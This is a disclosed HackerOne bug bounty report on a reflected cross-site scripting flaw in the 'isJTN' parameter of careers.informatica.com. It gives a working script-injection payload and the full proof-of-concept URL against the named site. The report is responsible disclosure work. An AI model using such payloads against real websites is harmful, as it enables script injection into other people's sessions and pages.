# [careers.informatica.com] XSS on "isJTN"

## Report Details
- **Report ID**: 190020
- **URL**: https://hackerone.com/reports/190020
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-12-10T01:07:44.215Z
- **Disclosed**: 2017-04-07T16:29:46.216Z

## Reporter
- **Username**: huntertxt
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: informatica

## Vulnerability Information
hi ,
i found XSS bug on parameter  "isJTN=" at careers.informatica.com give you ability to run java script code
tested on firefox 50.0.2 also on old version of google chrome in the last version , but if try this bug in chrome last version you will got a source code displayed on page with out run cuz security protected stop XSS code 

* POC

used payload   : </ScrIpt><SCRIPT>+alert("X");</SCRIPT>

https://careers.informatica.com/apply?applySource=Quick%20Apply&isJTN=</ScrIpt><SCRIPT>+alert("X");</SCRIPT>true&isQuickApply=false

are this eligible for swag !?
cheer


## Attachments
- information_xss2.jpg
